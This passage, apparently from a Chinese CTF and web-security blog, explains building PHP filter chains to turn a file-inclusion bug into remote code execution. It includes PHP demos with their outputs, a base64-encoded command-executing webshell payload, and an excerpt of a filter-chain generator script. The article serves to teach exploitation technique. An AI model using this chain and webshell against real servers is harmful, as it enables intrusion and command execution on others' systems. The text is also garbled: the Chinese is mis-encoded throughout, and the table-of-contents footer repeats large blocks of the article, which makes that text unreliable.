class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line"><span class="number">4</span>Csunrg=</span><br></pre></td></tr></table></figure>

<p><strong>åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦</strong></p>
<p><strong>è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ</strong></p>
<p><strong>æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ <?=`$_GET[0]`;;?>ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†</strong></p>
<h3>æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥</h3>

<p><strong>ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼š</strong><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main/res">å­—ç¬¦çš„æ•´ç†</a></p>
<h3>ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ</h3>

<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py">æ¢­å“ˆè„šæœ¬</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br></pre></td></tr></table></figure>

<p><strong>ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯</strong></p>
</h6></h6></h6></h6>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">æ€»è§ˆ</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-å®‰å…¨</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">é€šè¿‡phpå‡½æ•°çš„åˆ†æè§£æphpçš„filteré“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">php-base64å‡½æ•°ç‰¹æ€§åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.1.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.2.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+2


æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç 
æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.3.</span> <span class="toc-text">


æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç 
æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.4.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

